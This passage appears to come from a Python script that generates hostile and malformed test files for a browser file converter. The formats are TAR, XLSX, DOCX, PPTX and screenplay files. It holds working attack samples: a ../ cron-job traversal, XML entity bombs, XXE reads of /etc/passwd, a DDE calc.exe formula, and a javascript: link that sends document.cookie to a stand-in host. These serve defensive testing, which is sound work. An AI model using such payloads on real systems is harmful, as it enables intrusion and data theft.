    "Valid, but without the two empty blocks that close a TAR. The file ends where a file "
    "would end, and that is enough.",
    "tar", node="succeeds",
)
arch(
    "picture-named.tar",
    GOOD,
    "A PNG with a .tar name.",
    "png", node="succeeds", mismatch=True,
)

BIG_TAR = tar_of(*[(tar_header(b"file%02d.txt" % i, 4000), bytes(random.Random(i).randrange(32, 127) for _ in range(4000))) for i in range(12)])
arch(
    "truncated.tar.gz",
    gz(BIG_TAR)[: len(gz(BIG_TAR)) // 2],
    "A TAR.GZ cut off half-way.",
    "tgz", node="fails", note=NOT_TGZ,
)
arch(
    "bomb.tar.gz",
    gz(tar_of((tar_header(b"zeros.bin", 400 * 1024 * 1024), b"\0" * (400 * 1024 * 1024)))),
    "Four hundred megabytes of nothing in a TAR, squeezed to 390 kilobytes. Unpacking stops "
    "at the limit.",
    "tgz", node="fails", note=UNPACKS_TOO_BIG,
)
arch(
    "ten-thousand-and-one-files.tar.gz",
    gz(tar_of(*[(tar_header(b"f%05d" % i), b"") for i in range(10_001)])),
    "Ten thousand and one empty files: five megabytes of headers that squeeze to a few "
    "kilobytes.",
    "tgz", node="fails", note=TOO_MANY_FILES,
)
arch(
    "climbs-out.tar.gz",
    gz(tar_of(FILE, (tar_header(b"../../../etc/cron.d/evil", 18), b"* * * * * root sh\n"))),
    "A file named with ../, inside a TAR.GZ.",
    "tgz", node="fails", note=ESCAPES,
)
damaged = bytearray(gz(BIG_TAR))
for i in range(len(damaged) * 2 // 3, len(damaged) * 2 // 3 + 100):
    damaged[i] ^= 0xFF
arch(
    "damaged.tar.gz",
    bytes(damaged),
    "A sound TAR.GZ with a hundred bytes of its packed data inverted, two thirds of the way in.",
    "tgz", node="fails", note=NOT_TGZ,
)
arch(
    "words-squeezed.tar.gz",
    gz(b"This is a sentence, not an archive.\n" * 20),
    "A gzip file with a .tar.gz name that holds text and no TAR.",
    "unregistered",
)
arch(
    "zip-named.tar.gz",
    GOOD_ZIP,
    "A sound ZIP with a .tar.gz name.",
    "zip", node="succeeds", mismatch=True,
)

# --- workbooks: XLSX ------------------------------------------------------------------------------
# A workbook is a ZIP of XML, so it inherits what goes wrong with both: bombs in the ZIP, bombs
# in the XML, parts that point outside the file. And it has trouble of its own: formulas that
# run programs, links to other people's servers, sheets that are hidden. Each is converted to
# JSON.
G = "workbooks"
import zipfile as _zipfile

NOT_BOOK = "This file is not a valid XLSX workbook"
BOOK_TOO_BIG = "This workbook is too large to convert in a browser"
SHEET_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"


def book_parts():
    with _zipfile.ZipFile(os.path.join(FIXTURES, "xlsx/sample.xlsx")) as z:
        return {name: z.read(name) for name in z.namelist()}


def book(change=None, extra=None) -> bytes:
    """The sample workbook with parts replaced (bytes), removed (None) or added."""
    parts = book_parts()
    for name, body in (change or {}).items():
        if body is None:
            parts.pop(name, None)
        else:
            parts[name] = body
    parts.update(extra or {})
    out = _io.BytesIO()
    with _zipfile.ZipFile(out, "w", _zipfile.ZIP_DEFLATED) as z:
        for name, body in parts.items():
            info = _zipfile.ZipInfo(name, (2026, 11, 23, 12, 0, 0))
            info.compress_type = _zipfile.ZIP_DEFLATED
            z.writestr(info, body)
    return out.getvalue()


def sheet(rows: str, before: str = "") -> bytes:
    return ('<?xml version="1.0"?>%s<worksheet xmlns="%s"><sheetData>%s</sheetData></worksheet>' % (before, SHEET_NS, rows)).encode()


def text_cell(at, value):
    return '<c r="%s" t="inlineStr"><is><t>%s</t></is></c>' % (at, value)


def work(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


SAMPLE_BOOK = book()
work(
    "truncated.xlsx",
    SAMPLE_BOOK[: len(SAMPLE_BOOK) // 2],
    "A workbook cut off half-way. It is a ZIP, and the list of what it holds is at the end.",
    "xlsx", node="fails", note=NOT_BOOK,
)
work(
    "entity-bomb.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("A1", "name") + '</row><row r="2">' + text_cell("A2", "&a8;") + "</row>", "<!DOCTYPE l [" + xml_entities.decode() + "]>")}),
    'The "billion laughs" inside a sheet: one cell that stands for a gigabyte of the letter a. '
    "A workbook's XML never defines shorthand of its own, and one that does is refused.",
    "xlsx", node="fails", note=NOT_BOOK,
)
work(
    "reads-a-local-file.xlsx",
    book({"xl/sharedStrings.xml": b'<?xml version="1.0"?><!DOCTYPE sst [<!ENTITY x SYSTEM "file:///etc/passwd">]><sst xmlns="' + SHEET_NS.encode() + b'"><si><t>&x;</t></si></sst>'}),
    "The text shared between cells asks the reader to fetch a file from the computer and put "
    "it in a cell.",
    "xlsx", node="fails", note=NOT_BOOK,
)
work(
    "bomb-inside.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("A1", "x") + "</row>" + " " * (300 * 1024 * 1024))}),
    "A sheet of three hundred megabytes of spaces, packed into the workbook as 290 kilobytes.",
    "xlsx", node="fails", note=BOOK_TOO_BIG,
)
work(
    "formulas-that-run-programs.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet(
        '<row r="1">' + text_cell("A1", "name") + text_cell("B1", "amount") + "</row>"
        "<row r=\"2\">" + text_cell("A2", "Ada") + "<c r=\"B2\"><f>cmd|' /C calc.exe'!A0</f><v>0</v></c></row>"
        '<row r="3">' + text_cell("A3", "Grace") + '<c r="B3" t="str"><f>WEBSERVICE("http://elsewhere.example/?"&amp;A2)</f><v>ok</v></c></row>'
    )}),
    "Two formulas: one that asks Windows to start a program, and one that sends a cell to "
    "another site. Neither is worked out and neither is carried across; what is read is the "
    "value each last showed.",
    "xlsx", node="succeeds", absent="calc.exe",
)
work(
    "linked-to-elsewhere.xlsx",
    book(extra={
        "xl/externalLinks/externalLink1.xml": b'<?xml version="1.0"?><externalLink xmlns="' + SHEET_NS.encode() + b'"><externalBook r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></externalLink>',
        "xl/externalLinks/_rels/externalLink1.xml.rels": b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="http://elsewhere.example/prices.xlsx" TargetMode="External"/></Relationships>',
        "xl/vbaProject.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"macro" * 100,
    }),
    "A workbook that draws figures from a file on another site when it is opened, and carries "
    "a macro. Neither part is ever opened.",
    "xlsx", node="succeeds", absent="elsewhere.example",
)
work(
    "every-sheet-hidden.xlsx",
    book({"xl/workbook.xml": book_parts()["xl/workbook.xml"].replace(b'<sheet name="People"', b'<sheet name="People" state="hidden"').replace(b'<sheet name="Totals"', b'<sheet name="Totals" state="veryHidden"')}),
    "A workbook in which every sheet is hidden. What is hidden is not what its owner meant to "
    "hand over, and is not read.",
    "xlsx", node="fails", note="This workbook has no rows in it",
)
work(
    "sheet-is-outside-the-workbook.xlsx",
    book({"xl/_rels/workbook.xml.rels": book_parts()["xl/_rels/workbook.xml.rels"].replace(b"worksheets/sheet2.xml", b"../../../../etc/passwd").replace(b"worksheets/sheet3.xml", b"../../x")}),
    "The workbook says its sheets are files outside the workbook.",
    "xlsx", node="fails", note=NOT_BOOK,
)
work(
    "last-cell-of-the-sheet.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("XFD1", "far") + '</row><row r="2"><c r="XFD2"><v>1</v></c></row>')}),
    "Valid: one value in the last column a sheet has, sixteen thousand columns from the first.",
    "xlsx", node="succeeds",
)
work(
    "small-in-the-file-vast-when-laid-out.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet("".join('<row r="%d"><c r="XFD%d"><v>1</v></c></row>' % (i, i) for i in range(1, 2001)))}),
    "Two thousand cells, one to a row, each in the last column of the sheet. Laid out as a "
    "table that is thirty-two million cells. Counted by the room it takes, not by the cells "
    "in the file.",
    "xlsx", node="fails", note=BOOK_TOO_BIG,
)
work(
    "cell-beyond-the-sheet.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("ZZZ1", "beyond") + '</row><row r="2"><c r="ZZZ2"><v>1</v></c></row>')}),
    "A cell in a column past the last one a sheet has.",
    "xlsx", node="fails", note=NOT_BOOK,
)
work(
    "a-row-of-two-million-cells.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + "<c><v>1</v></c>" * 2_000_000 + "</row>")}),
    "One row of two million cells, none of which says where it is. Four million tags: counted, and turned away, before any is read.",
    "xlsx", node="fails", note=BOOK_TOO_BIG,
)
work(
    "dates-that-are-not-days.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("A1", "when") + '</row><row r="2"><c r="A2" s="1"><v>-5</v></c></row><row r="3"><c r="A3" s="1"><v>1e300</v></c></row><row r="4"><c r="A4" s="1"><v>NaN</v></c></row>')}),
    "Cells shown as dates whose numbers are no day there has been: minus five, a one with "
    "three hundred noughts, and not a number at all. Each is left as what it is.",
    "xlsx", node="succeeds",
)
work(
    "no-list-of-sheets.xlsx",
    book({"xl/workbook.xml": None}),
    "A workbook with its sheets inside and without the part that lists them.",
    "xlsx", node="fails", note=NOT_BOOK,
)
work(
    "locked-with-a-password.xlsx",
    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 16 + b"\x3e\x00\x03\x00\xfe\xff\x09\x00" + b"\0" * 480 + b"E\0n\0c\0r\0y\0p\0t\0e\0d\0P\0a\0c\0k\0a\0g\0e\0" + b"\0" * 480,
    "A workbook locked with a password is not a ZIP at all: it is kept in an older kind of "
    "container, scrambled. Recognised as that, and not converted.",
    "unregistered",
)
work(
    "picture-named.xlsx",
    GOOD,
    "A PNG with an .xlsx name.",
    "png", node="succeeds", mismatch=True,
)
work(
    "archive-named.xlsx",
    GOOD_ZIP,
    "An ordinary ZIP with an .xlsx name. A workbook is a ZIP, but a ZIP is not a workbook.",
    "zip", node="succeeds", mismatch=True,
)
work(
    "workbook-named.zip",
    SAMPLE_BOOK,
    "A sound workbook with a .zip name. It is converted as the workbook it is, not unpacked.",
    "xlsx", node="succeeds", mismatch=True,
)
work(
    "table-named.xlsx",
    b"id,name\n1,Ada\n2,Grace\n",
    "A CSV with an .xlsx name, as some programs save when asked for 'Excel'.",
    "unknown",
)

# --- documents: DOCX ------------------------------------------------------------------------------
# A Word document is a ZIP of XML like a workbook, with the same bombs. Its own trouble is what
# it carries besides its text: links that are code, pictures and templates fetched from other
# sites when it is opened, macros, and words its author deleted or hid and believes are gone.
# Each is converted to HTML.
G = "documents"
NOT_DOC = "This file is not a valid DOCX document"
WNS = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'


def doc_parts():
    with _zipfile.ZipFile(os.path.join(FIXTURES, "docx/sample.docx")) as z:
        return {name: z.read(name) for name in z.namelist()}


def doc(change=None, extra=None) -> bytes:
    parts = doc_parts()
    for name, body in (change or {}).items():
        if body is None:
            parts.pop(name, None)
        else:
            parts[name] = body
    parts.update(extra or {})
    out = _io.BytesIO()
    with _zipfile.ZipFile(out, "w", _zipfile.ZIP_DEFLATED) as z:
        for name, body in parts.items():
            info = _zipfile.ZipInfo(name, (2026, 11, 23, 12, 0, 0))
            info.compress_type = _zipfile.ZIP_DEFLATED
            z.writestr(info, body)
    return out.getvalue()


def body_of(inner: str, before: str = "") -> bytes:
    return ('<?xml version="1.0"?>%s<w:document %s><w:body>%s</w:body></w:document>' % (before, WNS, inner)).encode()


def words(text):
    return "<w:p><w:r><w:t>%s</w:t></w:r></w:p>" % text


def docu(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


SAMPLE_DOC = doc()
RELS = doc_parts()["word/_rels/document.xml.rels"]
docu(
    "truncated.docx",
    SAMPLE_DOC[: len(SAMPLE_DOC) // 2],
    "A Word document cut off half-way.",
    "docx", node="fails", note=NOT_DOC,
)
docu(
    "entity-bomb.docx",
    doc({"word/document.xml": body_of(words("&a8;"), "<!DOCTYPE l [" + xml_entities.decode() + "]>")}),
    'The "billion laughs" as a paragraph: one line that stands for a gigabyte of the letter a.',
    "docx", node="fails", note=NOT_DOC,
)
docu(
    "reads-a-local-file.docx",
    doc({"word/document.xml": body_of(words("&x;"), '<!DOCTYPE l [<!ENTITY x SYSTEM "file:///etc/passwd">]>')}),
    "A paragraph that asks the reader to fetch a file from the computer and print it.",
    "docx", node="fails", note=NOT_DOC,
)
docu(
    "bomb-inside.docx",
    doc({"word/document.xml": body_of(words("x") + " " * (300 * 1024 * 1024))}),
    "A document whose text part is three hundred megabytes of spaces, packed to 290 kilobytes.",
    "docx", node="fails", note="This document is too large to convert in a browser",
)
docu(
    "link-that-is-code.docx",
    doc({"word/_rels/document.xml.rels": RELS.replace(b"https://omsett.com", b"javascript:fetch('http://elsewhere.example/'+document.cookie)")}),
    "A link whose address is a script. In Word it does nothing; on the web page made from the "
    "document it would run. The words are kept and the address is not.",
    "docx", node="succeeds", absent="javascript",
)
docu(
    "fetches-a-picture.docx",
    doc({"word/_rels/document.xml.rels": RELS.replace(b'Target="media/image1.png"', b'Target="http://elsewhere.example/seen.png" TargetMode="External"')}),
    "A picture that is not in the document but on another site, fetched each time the document "
    "is opened, which tells that site who opened it and when. It is not fetched, and its "
    "address is not carried into the page.",
    "docx", node="succeeds", absent="elsewhere.example",
)
docu(
    "fetches-a-template.docx",
    doc(extra={
        "word/settings.xml": ('<?xml version="1.0"?><w:settings %s><w:attachedTemplate r:id="rId1"/></w:settings>' % WNS).encode(),
        "word/_rels/settings.xml.rels": b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://elsewhere.example/evil.dotm" TargetMode="External"/></Relationships>',
        "word/vbaProject.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"Sub AutoOpen() Shell(cmd) End Sub" * 20,
    }),
    "A document that loads its template, macros included, from another site when opened, and "
    "carries a macro of its own. Neither part is ever opened.",
    "docx", node="succeeds", absent="AutoOpen",
)
docu(
    "web-page-inside.docx",
    doc(
        {"word/document.xml": body_of(words("The visible text.") + '<w:altChunk r:id="rId9"/>')},
        {"word/afchunk.html": b"<html><body><script>alert(1)</script><h1>Smuggled</h1></body></html>"},
    ),
    "A document with a whole web page tucked inside it, script and all, for Word to paste in "
    "when it opens. It is not read.",
    "docx", node="succeeds", absent="Smuggled",
)
docu(
    "what-was-deleted.docx",
    doc({"word/document.xml": body_of(
        '<w:p><w:r><w:t xml:space="preserve">The price is </w:t></w:r><w:del w:id="1"><w:r><w:delText>SECRET-OLD-PRICE</w:delText></w:r></w:del>'
        '<w:ins w:id="2"><w:r><w:t>agreed</w:t></w:r></w:ins><w:r><w:rPr><w:vanish/></w:rPr><w:t> SECRET-HIDDEN-NOTE</w:t></w:r></w:p>'
    )}),
    "Words deleted with changes tracked, and words formatted as hidden. Both are still in the "
    "file, and neither is what the document says. Neither is carried across.",
    "docx", node="succeeds", absent="SECRET-",
)
docu(
    "tables-two-hundred-deep.docx",
    doc({"word/document.xml": body_of("<w:tbl><w:tr><w:tc>" * 200 + words("deep") + "</w:tc></w:tr></w:tbl>" * 200)}),
    "A table inside a table, two hundred times over.",
    "docx", node="fails", note=NOT_DOC,
)
docu(
    "no-text-part.docx",
    doc({"word/document.xml": None}),
    "A document with its styles and pictures and without the part that holds its text.",
    "docx", node="fails", note=NOT_DOC,
)
docu(
    "empty-paragraphs.docx",
    doc({"word/document.xml": body_of("<w:p/>" * 50)}),
    "Fifty paragraphs with nothing in any of them.",
    "docx", node="fails", note="This document has no text in it to convert",
)
docu(
    "picture-named.docx",
    GOOD,
    "A PNG with a .docx name.",
    "png", node="succeeds", mismatch=True,
)
docu(
    "archive-named.docx",
    GOOD_ZIP,
    "An ordinary ZIP with a .docx name.",
    "zip", node="succeeds", mismatch=True,
)
docu(
    "workbook-named.docx",
    SAMPLE_BOOK,
    "A workbook with a .docx name. Both are ZIPs of XML, and they are told apart by what is "
    "inside.",
    "xlsx", node="succeeds", mismatch=True,
)
docu(
    "document-named.zip",
    SAMPLE_DOC,
    "A sound Word document with a .zip name. It is converted as the document it is.",
    "docx", node="succeeds", mismatch=True,
)
docu(
    "older-word.doc",
    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 16 + b"\x3e\x00\x03\x00\xfe\xff\x09\x00" + b"\0" * 480 + b"W\0o\0r\0d\0D\0o\0c\0u\0m\0e\0n\0t\0" + b"\0" * 480,
    "The older kind of Word document, from before 2007, which is not a ZIP at all.",
    "unregistered",
)

# --- presentations: PPTX --------------------------------------------------------------------------
# A presentation is a ZIP of XML like a document, with the same bombs and the same things
# fetched from elsewhere. What is its own is what the presenter kept from the audience: slides
# that are hidden, and the notes they read from. Each is converted to HTML.
G = "slides"
NOT_DECK = "This file is not a valid PPTX presentation"


def deck_parts():
    with _zipfile.ZipFile(os.path.join(FIXTURES, "pptx/sample.pptx")) as z:
        return {name: z.read(name) for name in z.namelist()}


def deck(change=None, extra=None) -> bytes:
    parts = deck_parts()
    for name, body in (change or {}).items():
        if body is None:
            parts.pop(name, None)
        else:
            parts[name] = body
    parts.update(extra or {})
    out = _io.BytesIO()
    with _zipfile.ZipFile(out, "w", _zipfile.ZIP_DEFLATED) as z:
        for name, body in parts.items():
            info = _zipfile.ZipInfo(name, (2026, 11, 23, 12, 0, 0))
            info.compress_type = _zipfile.ZIP_DEFLATED
            z.writestr(info, body)
    return out.getvalue()


def slides(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


SAMPLE_DECK = deck()
DECK = deck_parts()
FIRST = DECK["ppt/slides/slide1.xml"]
slides(
    "truncated.pptx",
    SAMPLE_DECK[: len(SAMPLE_DECK) // 2],
    "A presentation cut off half-way.",
    "pptx", node="fails", note=NOT_DECK,
)
slides(
    "entity-bomb.pptx",
    deck({"ppt/slides/slide1.xml": FIRST.replace(b"<p:sld ", b"<!DOCTYPE l [" + xml_entities + b"]><p:sld ", 1).replace(b"Omsett", b"&a8;", 1)}),
    'The "billion laughs" as a slide title.',
    "pptx", node="fails", note=NOT_DECK,
)
slides(
    "bomb-inside.pptx",
    deck({"ppt/slides/slide1.xml": FIRST + b" " * (300 * 1024 * 1024)}),
    "A slide of three hundred megabytes of spaces, packed to 290 kilobytes.",
    "pptx", node="fails", note="This presentation is too large to convert in a browser",
)
slides(
    "what-the-audience-was-not-shown.pptx",
    SAMPLE_DECK,
    "A sound presentation with a hidden slide and speaker's notes, both marked. Neither was "
    "shown to the audience and neither is carried across.",
    "pptx", node="succeeds", absent="SECRET-",
)
slides(
    "link-that-is-code.pptx",
    deck({"ppt/slides/_rels/slide2.xml.rels": DECK["ppt/slides/_rels/slide2.xml.rels"].replace(b"https://omsett.com", b"javascript:fetch('http://elsewhere.example/')")}),
    "A link on a slide whose address is a script. The words are kept and the address is not.",
    "pptx", node="succeeds", absent="javascript",
)
slides(
    "runs-a-program-when-clicked.pptx",
    deck({"ppt/slides/_rels/slide2.xml.rels": DECK["ppt/slides/_rels/slide2.xml.rels"].replace(b"https://omsett.com", b"file:///C:/Windows/System32/calc.exe")}),
    "A link on a slide that starts a program on the computer when clicked during the show.",
    "pptx", node="succeeds", absent="calc.exe",
)
slides(
    "fetches-a-picture.pptx",
    deck({"ppt/slides/_rels/slide3.xml.rels": DECK["ppt/slides/_rels/slide3.xml.rels"].replace(b'Target="../media/image1.png"', b'Target="http://elsewhere.example/seen.png" TargetMode="External"')}),
    "A picture kept on another site and fetched whenever the presentation is opened. It is "
    "not fetched, and its address is not carried into the page.",
    "pptx", node="succeeds", absent="elsewhere.example",
)
slides(
    "picture-is-outside-the-presentation.pptx",
    deck({"ppt/slides/_rels/slide3.xml.rels": DECK["ppt/slides/_rels/slide3.xml.rels"].replace(b"../media/image1.png", b"../../../../../etc/passwd")}),
    "A slide that says its picture is a file elsewhere on the computer.",
    "pptx", node="succeeds", absent="passwd",
)
slides(
    "every-slide-hidden.pptx",
    deck({name: body.replace(b"<p:sld ", b'<p:sld show="0" ', 1) for name, body in DECK.items() if name.startswith("ppt/slides/slide")}),
    "A presentation in which every slide is hidden.",
    "pptx", node="fails", note="This presentation has no text in it to convert",
)
slides(
    "one-slide-two-thousand-times.pptx",
    deck({"ppt/presentation.xml": DECK["ppt/presentation.xml"].replace(b'<p:sldId id="256" r:id="rId1"/>', b'<p:sldId id="256" r:id="rId1"/>' * 2000)}),
    "A list of slides that names the same slide two thousand times, so that reading the "
    "presentation reads it two thousand times.",
    "pptx", node="fails", note=NOT_DECK,
)
slides(
    "no-list-of-slides.pptx",
    deck({"ppt/presentation.xml": None}),
    "Slides, without the part that says which they are and in what order.",
    "pptx", node="fails", note=NOT_DECK,
)
slides(
    "groups-two-hundred-deep.pptx",
    deck({"ppt/slides/slide1.xml": FIRST.replace(b"<p:spTree>", b"<p:spTree>" + b"<p:grpSp>" * 200, 1).replace(b"</p:spTree>", b"</p:grpSp>" * 200 + b"</p:spTree>", 1)}),
    "A group of shapes inside a group of shapes, two hundred times over.",
    "pptx", node="fails", note=NOT_DECK,
)
slides(
    "picture-named.pptx",
    GOOD,
    "A PNG with a .pptx name.",
    "png", node="succeeds", mismatch=True,
)
slides(
    "document-named.pptx",
    SAMPLE_DOC,
    "A Word document with a .pptx name. Both are ZIPs of XML, told apart by what is inside.",
    "docx", node="succeeds", mismatch=True,
)
slides(
    "slides-named.zip",
    SAMPLE_DECK,
    "A sound presentation with a .zip name. It is converted as the presentation it is.",
    "pptx", node="succeeds", mismatch=True,
)
slides(
    "older-powerpoint.ppt",
    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 16 + b"\x3e\x00\x03\x00\xfe\xff\x09\x00" + b"\0" * 480 + b"P\0o\0w\0e\0r\0P\0o\0i\0n\0t\0" + b"\0" * 480,
    "The older kind of PowerPoint file, from before 2007, which is not a ZIP at all.",
    "unregistered",
)

# --- screenplays: Fountain, Final Draft, Drafter --------------------------------------------------
# A script is text a writer typed, and writers type anything. Fountain has no invalid form, so
# what matters is what a script carries that is not the script: notes to self, scenes set aside,
# earlier drafts. Final Draft is XML, with XML's bombs. A Drafter package is a ZIP with a
# manifest that says which file inside is the script, and a manifest can lie. Each is converted
# to Final Draft (a Final Draft file, to Fountain).
G = "scripts"
import json as _json

NOT_FDX = "This file is not a valid Final Draft script"
NOT_PACKAGE = "This file is not a valid Drafter package"
NOTHING = "This script has nothing in it to convert"
DRAFTER_TYPE = b"application/vnd.drafter.package+zip"


def script(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


FOUNTAIN_SAMPLE = sample("fountain/sample.fountain")
FDX_SAMPLE = sample("fdx/sample.fdx")
DRAFTER_SAMPLE = sample("drafter/sample.drafter")

script(
    "what-the-writer-set-aside.fountain",
    FOUNTAIN_SAMPLE,
    "A sound script with a note to self, a scene set aside between /* and */, and headings of "
    "the writer's outline, each marked. None of them is the script, and none is carried "
    "across.",
    "fountain", node="succeeds", absent="SECRET-",
)
script(
    "marks-that-open-nothing.fountain",
    b"INT. ROOM - DAY\n\n" + b"*a _b " * 40_000 + b"\n\n" + b"/*" * 40_000 + b"\n\n" + b"[[" * 40_000 + b"\n",
    "Eighty thousand marks for emphasis that are never closed, then forty thousand openings "
    "of a set-aside block and forty thousand of a note, none closed either.",
    "fountain", node="succeeds",
)
script(
    "types-its-own-tags.fountain",
    b'INT. ROOM - DAY\n\n</Text></Paragraph><Paragraph Type="Scene Heading"><Text>INJECTED]]>&amp;<script>alert(1)</script>\n\nADA\n<Text Style="Bold">Hello</Text>\n',
    "A script whose action and dialogue are written as the tags of the file it will become. "
    "They are what a character typed, and are written as text.",
    "fountain", node="succeeds", absent='<Paragraph Type="Scene Heading"><Text>INJECTED',
)
script(
    "nothing-but-notes.fountain",
    b"[[Only a note to self.]]\n\n/* And a scene set aside.\nINT. NOWHERE - NIGHT\n*/\n\n# An outline heading\n\n= A summary.\n",
    "A file of notes, set-aside material and outline, with no script in it.",
    "fountain", node="fails", note=NOTHING,
)
script(
    "picture-named.fountain",
    GOOD,
    "A PNG with a .fountain name. A name can say that text is a script; it cannot make text "
    "of a picture.",
    "png", node="succeeds", mismatch=True,
)
script(
    "latin-1.fountain",
    "INT. CAFÉ - DAY\n\nZOË\nDéjà vu.\n".encode("latin-1"),
    "A script saved in an older encoding.",
    "unknown",
)

script(
    "truncated.fdx",
    FDX_SAMPLE[: len(FDX_SAMPLE) // 2],
    "A Final Draft script cut off half-way, in the middle of a tag.",
    "fdx", node="fails", note=NOT_FDX,
)
script(
    "entity-bomb.fdx",
    b'<?xml version="1.0"?>\n<!DOCTYPE FinalDraft [' + xml_entities + b']>\n<FinalDraft DocumentType="Script"><Content><Paragraph Type="Action"><Text>&a8;</Text></Paragraph></Content></FinalDraft>\n',
    'The "billion laughs" as a line of action.',
    "fdx", node="fails", note=NOT_FDX,
)
script(
    "reads-a-local-file.fdx",
    b'<?xml version="1.0"?>\n<!DOCTYPE FinalDraft [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<FinalDraft><Content><Paragraph Type="Action"><Text>&x;</Text></Paragraph></Content></FinalDraft>\n',
    "A script that asks the reader to fetch a file from the computer and print it as action.",
    "fdx", node="fails", note=NOT_FDX,
)
script(
    "notes-and-revisions.fdx",
    FDX_SAMPLE,
    "A sound script with a note attached to a line and a named revision, each marked. Neither "
    "is the script.",
    "fdx", node="succeeds", absent="SECRET-",
)
script(
    "no-script-inside.fdx",
    b'<?xml version="1.0"?>\n<FinalDraft DocumentType="Script"><TitlePage><Content><Paragraph><Text>A TITLE</Text></Paragraph></Content></TitlePage></FinalDraft>\n',
    "A title page and no script.",
    "fdx", node="fails", note=NOT_FDX,
)
script(
    "empty-paragraphs.fdx",
    b'<?xml version="1.0"?>\n<FinalDraft><Content>' + b'<Paragraph Type="Action"><Text></Text></Paragraph>' * 500 + b"</Content></FinalDraft>\n",
    "Five hundred paragraphs with nothing in any of them.",
    "fdx", node="fails", note=NOTHING,
)
script(
    "speeches-nested-a-thousand-deep.fdx",
    b'<?xml version="1.0"?>\n<FinalDraft><Content>' + b"<Paragraph><DualDialogue>" * 1000 + b'<Paragraph Type="Action"><Text>deep</Text></Paragraph>' + b"</DualDialogue></Paragraph>" * 1000 + b"</Content></FinalDraft>\n",
    "Two characters speaking at once, inside two characters speaking at once, a thousand "
    "times over.",
    "fdx", node="fails", note=NOT_FDX,
)
script(
    "data-named.fdx",
    b"<people><person><name>Ada</name></person></people>\n",
    "Ordinary XML with an .fdx name. It is data, and is converted as data.",
    "xml", node="succeeds", mismatch=True,
)
script(
    "script-named.xml",
    FDX_SAMPLE,
    "A sound Final Draft script with an .xml name. It is XML, and it is a script first.",
    "fdx", node="succeeds", mismatch=True,
)


def package(manifest=None, files=None, first=("mimetype", DRAFTER_TYPE)):
    """A Drafter package. The manifest is a dict changed from the sample's, or raw bytes."""
    with _zipfile.ZipFile(_io.BytesIO(DRAFTER_SAMPLE)) as z:
        parts = {n: z.read(n) for n in z.namelist()}
    base = _json.loads(parts["drafter.json"])
    if isinstance(manifest, dict):
        base.update(manifest)
        parts["drafter.json"] = _json.dumps(base).encode()
    elif manifest is not None:
        parts["drafter.json"] = manifest
    parts.update(files or {})
    parts.pop("mimetype")
    out = _io.BytesIO()
    with _zipfile.ZipFile(out, "w") as z:
        z.writestr(_zipfile.ZipInfo(first[0], (2026, 11, 23, 12, 0, 0)), first[1])
        for n, body in parts.items():
            if body is None:
                continue
            info = _zipfile.ZipInfo(n, (2026, 11, 23, 12, 0, 0))
            info.compress_type = _zipfile.ZIP_DEFLATED
            z.writestr(info, body)
    return out.getvalue()


script(
    "the-papers-beside-the-script.drafter",
    DRAFTER_SAMPLE,
    "A sound package holding, beside the script, an earlier draft, material the writer cut "
    "and their workbook, each marked. Those are the writer's own papers. The script is "
    "converted, and none of them goes with it.",
    "drafter", node="succeeds", absent="SECRET-",
)
script(
    "truncated.drafter",
    DRAFTER_SAMPLE[: len(DRAFTER_SAMPLE) // 2],
    "A package cut off half-way.",
    "drafter", node="fails", note=NOT_PACKAGE,
)
script(
    "script-is-outside-the-package.drafter",
    package({"main": "../../../etc/passwd"}),
    "The manifest says the script is a file outside the package.",
    "drafter", node="fails", note=NOT_PACKAGE,
)
script(
    "script-is-not-there.drafter",
    package({"main": "Another Film.fountain"}),
    "The manifest names a script that is not in the package.",
    "drafter", node="fails", note=NOT_PACKAGE,
)
script(
    "manifest-is-not-json.drafter",
    package(b'{"format": "drafter-package", "main": '),
    "A manifest that stops in the middle.",
    "drafter", node="fails", note=NOT_PACKAGE,
)
script(
    "manifest-is-two-megabytes.drafter",
    package({"note": "x" * (2 * 1024 * 1024)}),
    "A manifest twice the size the format allows one to be.",
    "drafter", node="fails", note=NOT_PACKAGE,
)
script(
    "manifest-of-another-format.drafter",
    package({"format": "something-else"}),
    "A package whose manifest says it is some other kind of file.",
    "drafter", node="fails", note=NOT_PACKAGE,
)
script(
    "holds-prose.drafter",
    package({"main": "cuts.md", "kind": "novel"}),
    "A sound package whose work is prose in Markdown, not a script.",
    "drafter", node="fails", note="This Drafter package holds prose, not a script. Its text is the Markdown file inside it",
)
script(
    "bomb-inside.drafter",
    package(files={"Omsett.fountain": b"INT. ROOM - DAY\n" + b" " * (300 * 1024 * 1024)}),
    "A package whose script is three hundred megabytes of spaces.",
    "drafter", node="fails", note=UNPACKS_TOO_BIG,
)
script(
    "says-it-is-something-else.drafter",
